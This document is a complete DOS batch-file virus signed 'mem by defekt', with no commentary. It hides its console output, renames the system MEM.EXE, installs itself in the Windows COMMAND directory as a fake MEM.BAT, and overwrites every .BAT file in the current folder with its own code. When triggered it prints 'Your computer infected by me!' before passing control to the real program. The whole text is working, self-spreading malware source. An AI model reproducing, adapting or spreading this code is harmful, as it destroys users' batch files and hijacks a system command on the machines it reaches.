@CTTY NUL%mem%
ECHO OFF
SET W=%windir%\COMMAND\MEM.BAT
IF %0==mem GOTO C
IF %0==MEM GOTO C
IF NOT EXIST %W% GOTO A
GOTO B
:A
CD %windir%\COMMAND
REN MEM.EXE M$.EXE
COPY %0 %W%
GOTO B
:B
FOR %%I IN (*.BAT) DO COPY %0 %%I
GOTO END
:C
@CTTY CON
ECHO Your computer infected by me!
PAUSE
CALL M$.EXE
:END mem by defekt